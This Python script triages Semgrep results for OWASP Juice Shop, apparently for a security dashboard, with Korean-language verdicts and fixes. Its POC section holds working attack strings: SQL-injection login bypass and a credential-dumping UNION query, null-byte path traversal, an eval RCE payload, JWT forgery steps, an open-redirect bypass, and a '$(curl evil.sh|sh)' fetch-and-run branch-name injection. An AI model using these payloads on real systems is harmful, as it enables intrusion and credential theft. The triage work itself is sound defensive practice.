#!/usr/bin/env python3
"""
SAST 초안 파이프라인 — Layer 2(트리아지) + 대시보드 데이터 빌드.

읽기  data/findings_normalized.json   (Layer-1 semgrep, 정규화됨)
쓰기  data/findings_triaged.json       (Layer-1 + Layer-2 판정)
      dashboard.html                    (인터랙티브 대시보드)

운영에서는 아래 VERDICTS 를 트리아지 LLM 이 triage/verdict_schema.json 에 맞춰 생성한다.
이 초안에서는 트리아지 계층이 실제 스캔 결과에 대해 직접 판정을 작성했다.
판정 문구는 한국어, 코드/증거/공격구문은 원문(코드)을 유지한다.
"""
import json, os, datetime

HERE = os.path.dirname(os.path.abspath(__file__))
NORM = os.path.join(HERE, "data", "findings_normalized.json")
OUT_JSON = os.path.join(HERE, "data", "findings_triaged.json")
OUT_HTML = os.path.join(HERE, "dashboard.html")

# ---- Layer-2 트리아지 판정 (스키마: triage/verdict_schema.json) --------------
V = {
"F001": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="LOW", reachable="true", priority="P4",
  category="ci-hardening", rationale="CI 스텝이 변경 가능한 태그(coverallsapp/github-action@v2)를 사용 — 태그가 조용히 다른 커밋으로 바뀔 수 있음.",
  evidence="uses: coverallsapp/github-action@v2", suggested_fix="40자리 커밋 SHA로 고정.",
  triage_note="실제 공급망 위생 이슈지만 우선순위 낮음. 변경가능 태그 7건 중 1건 — 중복 처리."),
"F002": dict(verdict="TRUE_POSITIVE", confidence=0.85, exploitability="MEDIUM", reachable="true", priority="P3",
  category="supply-chain", rationale="Heroku CLI 설치를 curl로 받아 바로 sh에 파이프 — 원격 서버 침해 시 CI 러너에서 RCE.",
  evidence="run: curl https://cli-assets.heroku.com/install.sh | sh", suggested_fix="파일을 먼저 받고 체크섬/서명 검증 후 실행.",
  triage_note="신뢰 벤더 도메인이라 위험은 낮아지나 완전히 제거되진 않음."),
"F003": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="LOW", reachable="true", priority="P4",
  category="ci-hardening", rationale="codeql-action/init 이 변경가능 @v3 에 고정.", evidence="uses: github/codeql-action/init@v3",
  suggested_fix="커밋 SHA로 고정.", triage_note="변경가능 태그 군집."),
"F004": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="LOW", reachable="true", priority="P4",
  category="ci-hardening", rationale="codeql-action/autobuild 이 변경가능 @v3 에 고정.", evidence="uses: github/codeql-action/autobuild@v3",
  suggested_fix="커밋 SHA로 고정.", triage_note="변경가능 태그 군집."),
"F005": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="LOW", reachable="true", priority="P4",
  category="ci-hardening", rationale="codeql-action/analyze 가 변경가능 @v3 에 고정.", evidence="uses: github/codeql-action/analyze@v3",
  suggested_fix="커밋 SHA로 고정.", triage_note="변경가능 태그 군집."),
"F006": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="LOW", reachable="true", priority="P4",
  category="ci-hardening", rationale="actions/checkout 이 변경가능 메이저 @v6 에 고정.", evidence="uses: actions/checkout@v6",
  suggested_fix="커밋 SHA로 고정.", triage_note="변경가능 태그 군집."),
"F007": dict(verdict="TRUE_POSITIVE", confidence=0.92, exploitability="LOW", reachable="true", priority="P3",
  category="ci-hardening", rationale="calibreapp/image-actions 가 @main(움직이는 브랜치)에 고정 — 가장 약한 참조.",
  evidence="uses: calibreapp/image-actions@main", suggested_fix="커밋 SHA로 고정.",
  triage_note="@main 은 버전 태그보다 위험 — 군집 내에서 우선순위 약간 상향."),
"F008": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="LOW", reachable="true", priority="P4",
  category="ci-hardening", rationale="peter-evans/create-pull-request 가 변경가능 @v8 에 고정.", evidence="uses: peter-evans/create-pull-request@v8",
  suggested_fix="커밋 SHA로 고정.", triage_note="변경가능 태그 군집."),
"F009": dict(verdict="TRUE_POSITIVE", confidence=0.7, exploitability="MEDIUM", reachable="true", priority="P3",
  category="ci-injection", rationale="github.ref_name 이 run: 안 wget URL에 삽입 — 셸 스텝에 신뢰불가 컨텍스트가 들어감.",
  evidence="wget https://.../${{ github.ref_name }}/data/static/challenges.yml", suggested_fix="ref_name 을 env: 변수로 옮기고 따옴표 처리.",
  triage_note="ref_name에 대한 공격자 영향은 제한적이나 주입 패턴 자체는 유효."),
"F010": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="LOW", reachable="true", priority="P4",
  category="ci-injection", rationale="ref_name 이 따옴표로 감싼 문자열 비교에 사용 — 따옴표 처리로 주입 가능성 제한.",
  evidence='if [ "${{ github.ref_name }}" = "master" ]', suggested_fix="env: 변수 우회 사용.",
  triage_note="따옴표 비교라 F009 대비 악용가능성 크게 낮음."),
"F011": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="LOW", reachable="true", priority="P4",
  category="ci-injection", rationale="F010과 동일한 따옴표 ref_name 비교 패턴.", evidence='if [ "${{ github.ref_name }}" = "master" ]',
  suggested_fix="env: 변수 우회 사용.", triage_note="따옴표 처리 — 악용가능성 낮음."),
"F012": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="LOW", reachable="true", priority="P4",
  category="ci-injection", rationale="동일한 따옴표 ref_name 비교 패턴.", evidence='if [ "${{ github.ref_name }}" = "master" ]',
  suggested_fix="env: 변수 우회 사용.", triage_note="따옴표 처리 — 악용가능성 낮음."),
"F013": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="LOW", reachable="true", priority="P4",
  category="ci-injection", rationale="동일한 따옴표 ref_name 비교 패턴.", evidence='if [ "${{ github.ref_name }}" = "master" ]',
  suggested_fix="env: 변수 우회 사용.", triage_note="따옴표 처리 — 악용가능성 낮음."),
"F014": dict(verdict="NEEDS_REVIEW", confidence=0.5, exploitability="LOW", reachable="unknown", priority="P4",
  category="supply-chain", rationale="의견성 신규 룰: .npmrc 에 min-release-age 미설정. 취약점이 아니라 하드닝 기본값.",
  evidence="package-lock=false (min-release-age 없음)", suggested_fix="원하면 min-release-age = 7 추가.",
  triage_note="정보성. 매우 최신 룰(npm v11.10). 결함이 아니라 팀 정책 판단 사항."),
"F015": dict(verdict="TRUE_POSITIVE", confidence=0.85, exploitability="LOW", reachable="false", priority="P3",
  category="sql-injection", rationale="사용자 criteria 를 문자열 접합으로 Sequelize 원시 쿼리에 삽입, 파라미터화 없음 — 실제 SQLi 패턴.",
  evidence='sequelize.query("... LIKE \'%"+criteria+"%\' ...")', suggested_fix="파라미터화 replacements / 바인드 파라미터 사용.",
  triage_note="파일이 data/static/codefixes/ — 챌린지용 코드픽스 스니펫이며 마운트된 라우트가 아님. 실제 대응물은 F035."),
"F016": dict(verdict="NEEDS_REVIEW", confidence=0.55, exploitability="LOW", reachable="false", priority="P4",
  category="sql-injection", rationale="템플릿 리터럴 쿼리지만 앞에서 injectionChars 필터로 입력을 거부함.",
  evidence="if (criteria.match(injectionChars)) { res.status(400) }", suggested_fix="블록리스트 필터보다 파라미터화 권장.",
  triage_note="코드픽스 스니펫; 완화 존재 — 효과는 injectionChars 정규식에 좌우."),
"F017": dict(verdict="FALSE_POSITIVE", confidence=0.75, exploitability="NONE", reachable="unknown", priority="P4",
  category="iac-misconfig", rationale="리소스가 'public'으로 명명된 서브넷 — 퍼블릭 서브넷은 ALB/NAT를 위해 공인 IP가 정상적으로 필요.",
  evidence='resource "aws_subnet" "public" { map_public_ip_on_launch = true }', suggested_fix="의도된 퍼블릭 서브넷이면 조치 불필요, 설계 문서화.",
  triage_note="의도적 퍼블릭 서브넷을 일반 룰이 오탐 — 전형적 IaC 오탐."),
"F018": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="MEDIUM", reachable="unknown", priority="P3",
  category="iac-misconfig", rationale="forward(리다이렉트 아님) 액션의 HTTP:80 ALB 리스너 — 평문 트래픽.",
  evidence='aws_lb_listener "http" { port=80 protocol="HTTP" ... type="forward" }', suggested_fix="80→443 리다이렉트, 또는 리스너에 TLS1.2+ 종단.",
  triage_note="별도 443 리스너 존재 여부와 80이 리다이렉트 의도인지 확인 필요."),
"F019": dict(verdict="FALSE_POSITIVE", confidence=0.75, exploitability="NONE", reachable="unknown", priority="P4",
  category="iac-misconfig", rationale="의도적 'public' 서브넷 (challenge_2 변형).", evidence='"public" 서브넷, map_public_ip_on_launch = true',
  suggested_fix="의도된 것이면 조치 불필요.", triage_note="F017과 동일한 설계 의도 패턴."),
"F020": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="MEDIUM", reachable="unknown", priority="P3",
  category="iac-misconfig", rationale="HTTP:80 forward 리스너 (challenge_2 변형).", evidence='port=80 protocol="HTTP" type="forward"',
  suggested_fix="80→443 리다이렉트.", triage_note="F018과 동일."),
"F021": dict(verdict="FALSE_POSITIVE", confidence=0.85, exploitability="NONE", reachable="unknown", priority="P4",
  category="iac-misconfig", rationale="파일명이 iacLeakedKeyChallenge_3_correct.tf — '정답' 참조 파일인데도 일반 룰에 걸림.",
  evidence='_correct.tf 에도 "public" 서브넷 map_public_ip_on_launch = true', suggested_fix="조치 불필요; 참조-정답 파일.",
  triage_note="교과서적 오탐: 문맥을 못 보는 룰이 '정답'을 걸어냄."),
"F022": dict(verdict="FALSE_POSITIVE", confidence=0.7, exploitability="LOW", reachable="unknown", priority="P4",
  category="iac-misconfig", rationale="*_correct.tf 참조 파일의 HTTP:80 리스너.", evidence='_correct.tf, port=80 HTTP 리스너',
  suggested_fix="조치 불필요; 참조 파일.", triage_note="의도된 정답 파일 — 오탐/노이즈로 처리."),
"F023": dict(verdict="TRUE_POSITIVE", confidence=0.8, exploitability="LOW", reachable="false", priority="P3",
  category="sql-injection", rationale="새니타이저가 무효(no-op): criteria.replace(...) 반환값을 버려서 criteria가 그대로 주입 가능.",
  evidence='criteria.replace(/"|\'|;|and|or/i,"")  // 반환값 미할당', suggested_fix="파라미터화; 블록리스트 replace 의존 금지.",
  triage_note="깨진 완화 TP. 코드픽스 스니펫(라이브 라우트 아님)."),
"F024": dict(verdict="NEEDS_REVIEW", confidence=0.5, exploitability="LOW", reachable="false", priority="P4",
  category="sql-injection", rationale="가드 `!startsWith('apple') || !startsWith('orange')` 는 항상 참이라 모든 입력이 400 — 공격 입력으로는 싱크 도달 불가.",
  evidence="if (!criteria.startsWith('apple') || !criteria.startsWith('orange')) { 400 }", suggested_fix="어쨌든 쿼리 파라미터화.",
  triage_note="과잉 차단 로직으로 실제 악용 어려움; 코드픽스 스니펫."),
"F025": dict(verdict="NEEDS_REVIEW", confidence=0.5, exploitability="LOW", reachable="unknown", priority="P4",
  category="supply-chain", rationale="frontend/.npmrc 에 min-release-age 없음 (F014와 동일 하드닝 룰).",
  evidence="package-lock=false", suggested_fix="정책상 필요하면 min-release-age 추가.", triage_note="정보성; 프론트엔드 패키지에 대한 F014 중복."),
"F026": dict(verdict="FALSE_POSITIVE", confidence=0.75, exploitability="NONE", reachable="unknown", priority="P4",
  category="iac-misconfig", rationale="infrastructure/terraform 의 의도적 'public' 서브넷.", evidence='"public" 서브넷, map_public_ip_on_launch = true',
  suggested_fix="의도된 것이면 조치 불필요.", triage_note="설계상 퍼블릭 서브넷."),
"F027": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="MEDIUM", reachable="unknown", priority="P3",
  category="iac-misconfig", rationale="infrastructure/terraform 의 HTTP:80 forward 리스너.", evidence='port=80 protocol="HTTP" type="forward"',
  suggested_fix="80→443 리다이렉트.", triage_note="리다이렉트 의도 확인 필요."),
"F028": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="HIGH", reachable="true", priority="P1",
  category="hardcoded-secret", rationale="JWT를 RS256으로 서명하는 privateKey를 Juice Shop이 리포지토리(encryptionkeys/)에 커밋 — 서명키가 사실상 공개라 공격자가 유효 토큰을 위조해 권한 상승 가능.",
  evidence="jwt.sign(user, privateKey, { algorithm: 'RS256' }) — 리포지토리 내 개인키 사용", suggested_fix="개인키를 시크릿 저장소/HSM에서 로드하고 커밋된 키 폐기·교체.",
  triage_note="실제 고위험 인증 결함(JWT 위조). 룰은 sign() 호출에 걸렸지만 진짜 원인은 커밋된 키 자체."),
"F029": dict(verdict="TRUE_POSITIVE", confidence=0.9, exploitability="HIGH", reachable="true", priority="P1",
  category="path-traversal", rationale="사용자 file 이 슬래시 가드 없이 res.sendFile 로 전달; poison null byte 처리 코드가 의도된 임의 파일 읽기임을 방증.",
  evidence="res.sendFile(path.resolve('ftp/', file)) + verifySuccessfulPoisonNullByteExploit(file)", suggested_fix="경로 정규화 후 의도 디렉터리 내부인지 검증; 파일명 허용목록 검증.",
  triage_note="유효한 완화 없음(F030/F031/F033과 달리) — sendFile 군에서 가장 위험."),
"F030": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="LOW", reachable="true", priority="P3",
  category="path-traversal", rationale="사용자 file 의 res.sendFile 이지만 `!file.includes('/')` 가드로 ../ 디렉터리 이탈 차단.",
  evidence="if (!file.includes('/')) { res.sendFile(path.resolve('encryptionkeys/', file)) }", suggested_fix="정규화 + 접두 경로 검증 추가.",
  triage_note="슬래시 가드로 디렉터리 이탈 완화; 잔여 위험은 encryptionkeys/ 내부 파일에 한정. F029보다 낮음."),
"F031": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="LOW", reachable="true", priority="P3",
  category="path-traversal", rationale="logs sendFile 에 동일한 `!file.includes('/')` 가드.", evidence="if (!file.includes('/')) { res.sendFile(path.resolve('logs/', file)) }",
  suggested_fix="정규화 + 접두 검증.", triage_note="F030처럼 완화됨."),
"F032": dict(verdict="TRUE_POSITIVE", confidence=0.98, exploitability="HIGH", reachable="true", priority="P1",
  category="sql-injection", rationale="req.body.email 이 로그인 라우트의 원시 SQL WHERE 절에 그대로 접합 — 전형적 인증우회 SQLi (' OR 1=1--).",
  evidence="sequelize.query(`... WHERE email = '${req.body.email}' ...`)", suggested_fix="파라미터화 replacements 사용; 요청 본문으로 SQL 문자열 생성 금지.",
  triage_note="Juice Shop 대표 로그인 SQLi. 라이브·외부·인증 전 단계 — 최우선."),
"F033": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="LOW", reachable="true", priority="P3",
  category="path-traversal", rationale="quarantine sendFile 에 동일한 `!file.includes('/')` 가드.", evidence="if (!file.includes('/')) { res.sendFile(path.resolve('ftp/quarantine/', file)) }",
  suggested_fix="정규화 + 접두 검증.", triage_note="F030/F031처럼 완화됨."),
"F034": dict(verdict="TRUE_POSITIVE", confidence=0.7, exploitability="MEDIUM", reachable="true", priority="P2",
  category="open-redirect", rationale="res.redirect(toUrl) 가 isRedirectAllowed 로 가드되지만, 그 검사는 부분문자열 기반이라 우회 가능 (예: ?to=https://evil?x=<허용URL>).",
  evidence="if (security.isRedirectAllowed(toUrl)) { res.redirect(toUrl) }", suggested_fix="부분문자열 포함이 아니라 호스트 정확 허용목록으로 검증.",
  triage_note="가드는 있으나 약함 — 의도된 오픈리다이렉트 챌린지; 우회 기법 필요."),
"F035": dict(verdict="TRUE_POSITIVE", confidence=0.97, exploitability="HIGH", reachable="true", priority="P1",
  category="sql-injection", rationale="req.query.q 가 템플릿 리터럴로 원시 Sequelize 쿼리에 흘러들어감, 파라미터화 없음 — 라이브 상품검색 union SQLi.",
  evidence="sequelize.query(`... LIKE '%${criteria}%' ...`), criteria = req.query.q", suggested_fix="검색어 파라미터화.",
  triage_note="라이브 라우트(routes/search.ts); F015/F023/F024 코드픽스 스니펫의 도달 가능 버전."),
"F036": dict(verdict="TRUE_POSITIVE", confidence=0.95, exploitability="HIGH", reachable="true", priority="P1",
  category="code-injection", rationale="사용자 영향 하의 code 가 사용자 프로필 핸들러의 eval() 로 전달 → 임의 코드 실행/SSTI.",
  evidence="username = eval(code)", suggested_fix="eval 제거; 기대값을 명시적으로 파싱/화이트리스트.",
  triage_note="Juice Shop SSTI/eval 챌린지 — 앱 프로세스 컨텍스트에서 RCE."),
"F037": dict(verdict="TRUE_POSITIVE", confidence=0.85, exploitability="MEDIUM", reachable="true", priority="P3",
  category="info-disclosure", rationale="serveIndex 로 /infrastructure 디렉터리 브라우징 활성화.", evidence="app.use('/infrastructure', serveIndexMiddleware, serveIndex('infrastructure', ...))",
  suggested_fix="디렉터리 리스팅 비활성화; 명시 파일만 서빙.", triage_note="뒤에 접근제어 미들웨어 존재 — 부분 완화; 커버리지 확인 필요."),
"F038": dict(verdict="TRUE_POSITIVE", confidence=0.85, exploitability="MEDIUM", reachable="true", priority="P2",
  category="info-disclosure", rationale="다운로드 가능한 민감 파일이 있는 /ftp 에 디렉터리 브라우징 활성화.", evidence="serveIndex('ftp', { icons: true })",
  suggested_fix="리스팅 비활성화; 민감 파일 접근 통제.", triage_note="의도된 디렉터리 리스팅 챌린지; /ftp 는 민감 산출물 노출."),
"F039": dict(verdict="TRUE_POSITIVE", confidence=0.8, exploitability="LOW", reachable="true", priority="P4",
  category="info-disclosure", rationale="/.well-known 에 디렉터리 브라우징.", evidence="serveIndex('.well-known', ...)",
  suggested_fix="리스팅 비활성화.", triage_note="민감도 낮은 디렉터리."),
"F040": dict(verdict="TRUE_POSITIVE", confidence=0.85, exploitability="MEDIUM", reachable="true", priority="P2",
  category="info-disclosure", rationale="키 자료 파일을 나열하는 /encryptionkeys 에 디렉터리 브라우징.", evidence="serveIndex('encryptionkeys', ...)",
  suggested_fix="리스팅 비활성화; 키 디렉터리 절대 노출 금지.", triage_note="영향 큼 — 암호화 키 파일을 열거."),
"F041": dict(verdict="TRUE_POSITIVE", confidence=0.85, exploitability="MEDIUM", reachable="true", priority="P3",
  category="info-disclosure", rationale="/support/logs 에 디렉터리 브라우징 → 접근로그 노출.", evidence="serveIndex('logs', ...)",
  suggested_fix="리스팅 비활성화; 로그 접근 제한.", triage_note="접근로그 노출 챌린지; 뒤에 접근제어 미들웨어."),
"F042": dict(verdict="FALSE_POSITIVE", confidence=0.75, exploitability="NONE", reachable="unknown", priority="P4",
  category="iac-misconfig", rationale="terraform/networking.tf 의 의도적 'public' 서브넷.", evidence='"public" 서브넷, map_public_ip_on_launch = true',
  suggested_fix="의도된 것이면 조치 불필요.", triage_note="설계상 퍼블릭 서브넷(중복 인프라 트리)."),
"F043": dict(verdict="NEEDS_REVIEW", confidence=0.6, exploitability="MEDIUM", reachable="unknown", priority="P3",
  category="iac-misconfig", rationale="terraform/networking.tf 의 HTTP:80 forward 리스너.", evidence='port=80 protocol="HTTP" type="forward"',
  suggested_fix="80→443 리다이렉트.", triage_note="리다이렉트 의도 확인 필요."),
}

# ---- 공격 예시 / PoC (Juice Shop 은 공개 OWASP 훈련 타깃) ---------------------
POC = {
"F002": "공급망: cli-assets.heroku.com 이 탈취되면 공격자 install.sh 를 서빙 → CI 러너에서 임의 코드 실행. 클라이언트 페이로드는 없음.",
"F009": "브랜치/태그 이름을 예: $(curl evil.sh|sh) 로 만들면 run: wget URL 에 삽입됨. 리포지토리 push/tag 권한 필요.",
"F028": "encryptionkeys/ 에 커밋된 개인키로 admin JWT 위조:\n  header  {\"alg\":\"RS256\",\"typ\":\"JWT\"}\n  payload {\"data\":{\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}}\n  리포지토리 내 RSA 개인키로 서명 후:\n  Authorization: Bearer <위조토큰>   → admin 으로 인증됨.",
"F029": "poison null byte 로 .md/.pdf 허용검사 우회:\n  GET /ftp/package.json%2500.md          → package.json 다운로드\n  GET /ftp/eastere.gg%2500.md",
"F030": "슬래시 가드가 ../ 이탈 차단; encryptionkeys/ 내부 파일에 한정:\n  GET /encryptionkeys/  후 GET /encryptionkeys/<나열된 파일>   (디렉터리 이탈 불가)",
"F031": "슬래시 가드가 이탈 차단; logs/ 디렉터리에만 한정.",
"F032": "email 필드 SQLi 로 인증 우회:\n  POST /rest/user/login\n  {\"email\":\"' OR 1=1--\",\"password\":\"x\"}      → 첫 사용자(admin)로 로그인\n  또는  {\"email\":\"admin@juice-sh.op'--\", ...}",
"F033": "슬래시 가드가 이탈 차단; ftp/quarantine/ 에만 한정.",
"F034": "허용목록이 부분문자열 기반 → 허용 URL 을 쿼리 파라미터로 넣어 우회:\n  GET /redirect?to=https://evil.example/?ref=https://github.com/juice-shop/juice-shop",
"F035": "상품 검색의 union 기반 SQLi:\n  GET /rest/products/search?q=qwert'))--                 (주입 확인)\n  GET /rest/products/search?q=qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--   (자격증명 덤프)",
"F036": "프로필 username 을 통한 서버측 템플릿/eval 주입:\n  username 을  #{7*7}  로 설정                              → 49 렌더(eval 확인)\n  RCE:  #{global.process.mainModule.require('child_process').execSync('id')}",
"F037": "GET /infrastructure   → infrastructure 폴더 디렉터리 리스팅.",
"F038": "GET /ftp   → 디렉터리 리스팅; 노출 파일 다운로드(쿠폰, 백업, 이스터에그).",
"F039": "GET /.well-known   → 디렉터리 리스팅.",
"F040": "GET /encryptionkeys   → 키 자료 파일 나열(이후 개별 파일 획득).",
"F041": "GET /support/logs   → 접근로그 노출(로그 디렉터리 리스팅).",
"F018": "평문 HTTP:80 리스너 → 유선상 도청/MITM 가능.",
"F020": "평문 HTTP:80 리스너 → 도청/MITM.",
"F027": "평문 HTTP:80 리스너 → 도청/MITM.",
"F043": "평문 HTTP:80 리스너 → 도청/MITM.",
}
for _id in ("F001","F003","F004","F005","F006","F008"):
    POC[_id] = "공급망: 참조된 변경가능 액션 태그를 재지정하면 CI 에서 공격자 코드가 실행됨. 직접적 HTTP 페이로드는 없음."
POC["F007"] = "공급망: @main 은 움직이는 브랜치 — 액션 소유자(또는 리포지토리 침해)가 언제든 CI 에서 임의 코드 실행 가능."
for _id in ("F015","F023"):
    POC[_id] = "F035 와 동일한 SQLi 유형이나, 이 파일은 코드픽스 훈련 스니펫 — 마운트된 라우트가 아니므로 공격할 라이브 엔드포인트가 없음."

# ---- 병합 -----------------------------------------------------------------
findings = json.load(open(NORM, encoding="utf-8"))
merged = []
for f in findings:
    v = V.get(f["id"], dict(verdict="NEEDS_REVIEW", confidence=0.0, exploitability="LOW",
                            reachable="unknown", priority="P4", category="uncategorized",
                            rationale="판정 없음.", evidence="", suggested_fix="", triage_note=""))
    v = {**v, "poc": POC.get(f["id"], "")}
    merged.append({**f, "triage": v})

json.dump(merged, open(OUT_JSON, "w", encoding="utf-8"), indent=2, ensure_ascii=False)

# ---- 요약 -----------------------------------------------------------------
def count(key, val): return sum(1 for m in merged if m["triage"][key] == val)
total = len(merged)
summary = {
    "target": "OWASP Juice Shop (juice-shop/juice-shop @ depth-1)",
    "scanner": "Semgrep 1.173.0 — p/owasp-top-ten + p/javascript + p/typescript",
    "scanned_at": datetime.date.today().isoformat(),
    "total": total,
    "true_positive": count("verdict", "TRUE_POSITIVE"),
    "false_positive": count("verdict", "FALSE_POSITIVE"),
    "needs_review": count("verdict", "NEEDS_REVIEW"),
    "p1": count("priority", "P1"), "p2": count("priority", "P2"),
    "p3": count("priority", "P3"), "p4": count("priority", "P4"),
    "high": count("exploitability", "HIGH"), "medium": count("exploitability", "MEDIUM"),
}
summary["signal_ratio"] = round(summary["true_positive"] / total, 3) if total else 0

# ---- 대시보드 렌더 (인터랙티브 버전은 dashboard_template.html 사용) ------------
tplp = os.path.join(HERE, "dashboard_template.html")
if os.path.exists(tplp):
    tpl = open(tplp, encoding="utf-8").read()
    htmlout = (tpl
        .replace("/*__DATA__*/null", json.dumps(merged, ensure_ascii=False))
        .replace("/*__META__*/null", json.dumps(summary, ensure_ascii=False)))
    open(OUT_HTML, "w", encoding="utf-8").write(htmlout)

print(f"트리아지 {total}건 -> {OUT_JSON}")
print(f"요약: TP={summary['true_positive']} FP={summary['false_positive']} "
      f"NR={summary['needs_review']} | P1={summary['p1']} P2={summary['p2']} "
      f"P3={summary['p3']} P4={summary['p4']} | 신호={summary['signal_ratio']}")
